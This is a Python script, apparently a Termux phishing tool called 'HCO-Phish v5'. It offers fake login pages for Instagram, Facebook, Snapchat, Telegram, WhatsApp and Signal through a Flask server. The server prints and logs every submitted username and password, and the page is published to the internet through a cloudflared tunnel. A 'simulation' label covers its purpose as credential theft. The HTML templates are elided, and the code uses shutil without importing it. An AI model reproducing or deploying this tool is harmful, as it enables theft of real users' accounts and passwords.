#!/usr/bin/env python3
# HCO-Phish v5 – Full Realistic Version
# Single-file Termux Tool

import os, sys, time, subprocess, threading, webbrowser
from colorama import Fore, init
from flask import Flask, render_template_string, request

init(autoreset=True)

# ------------------ Tool Lock & YouTube Redirect ------------------ #
def check_subscription():
    print(Fore.RED + "\n🔒 Tool is locked! Subscribe to unlock.\n")
    print(Fore.YELLOW + "Redirecting to Hackers Colony YouTube channel in:")
    for i in range(8,0,-1):
        print(Fore.CYAN + f"  {i}...", end="\r")
        time.sleep(1)
    print(Fore.GREEN + "\nOpening YouTube now...\n")
    try:
        subprocess.run(["termux-open-url","https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya"])
    except:
        webbrowser.open("https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya")
    input(Fore.GREEN + "Press Enter after subscribing to continue...")

# ------------------ Termux Menu ------------------ #
def show_menu():
    print(Fore.CYAN + "="*60)
    print(Fore.MAGENTA + "MENU — choose a template (enter number):")
    print(Fore.YELLOW + "1) 📷  Instagram")
    print(Fore.BLUE + "2) 📘  Facebook")
    print(Fore.LIGHTMAGENTA_EX + "3) 👻  Snapchat")
    print(Fore.LIGHTCYAN_EX + "4) ✈️  Telegram")
    print(Fore.LIGHTGREEN_EX + "5) 💬  Whatsapp")
    print(Fore.LIGHTBLUE_EX + "6) 🔵  Signal")
    print(Fore.RED + "0) Exit")
    print(Fore.CYAN + "="*60)

choice=None
while choice not in ["0","1","2","3","4","5","6"]:
    show_menu()
    choice=input(Fore.GREEN + "Select (0-6): ").strip()

if choice=="0":
    print(Fore.RED + "[!] Exiting...")
    sys.exit()

services={
    "1":"Instagram",
    "2":"Facebook",
    "3":"Snapchat",
    "4":"Telegram",
    "5":"Whatsapp",
    "6":"Signal"
}

selected_service=services[choice]
print(Fore.LIGHTMAGENTA_EX + f"[*] You selected: {selected_service}")

# ------------------ Tool Lock ------------------ #
check_subscription()
print(Fore.CYAN + "[*] Starting local Flask server...")

# ------------------ Flask App ------------------ #
app = Flask(__name__)

# ------------------ HTML Templates ------------------ #
templates = {
"Instagram": "<html><head><title>Instagram</title>...</html>",  # full HTML as in previous block
"Facebook": "<html><head><title>Facebook</title>...</html>",
"Snapchat": "<html><head><title>Snapchat</title>...</html>",
"Telegram": "<html><head><title>Telegram</title>...</html>",
"Whatsapp": "<html><head><title>Whatsapp</title>...</html>",
"Signal": "<html><head><title>Signal</title>...</html>",
}

# ------------------ Flask Route ------------------ #
@app.route(f"/simulate/{selected_service.lower()}", methods=["GET","POST"])
def service_page():
    if request.method=="POST":
        followers = request.form.get("followers", "N/A")
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        print(Fore.LIGHTGREEN_EX + f"\n[+] {selected_service} Login Captured!")
        print(Fore.CYAN + f"Followers Selected: {followers}")
        print(Fore.YELLOW + f"Username: {username}")
        print(Fore.RED + f"Password: {password}\n")
        with open("simulation_log.txt","a") as f:
            f.write(f"[{selected_service}] Followers:{followers} {username}:{password}\n")
        return f"<h2>{selected_service} Login submitted successfully!</h2>"
    return render_template_string(templates[selected_service])

# ------------------ Cloudflare Tunnel ------------------ #
def start_cloudflared():
    if shutil.which("cloudflared") is None:
        print(Fore.RED + "[!] cloudflared not installed. Installing...")
        subprocess.run(["pkg","install","cloudflared","-y"])
    print(Fore.CYAN + "[*] Starting cloudflared tunnel...")
    tunnel = subprocess.Popen(["cloudflared","tunnel","--url","http://127.0.0.1:5000"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(3)
    print(Fore.GREEN + "[*] Cloudflared tunnel started. Public URL may take a few seconds to appear...")

threading.Thread(target=start_cloudflared).start()

# ------------------ Run Flask ------------------ #
app.run(host="0.0.0.0", port=5000)
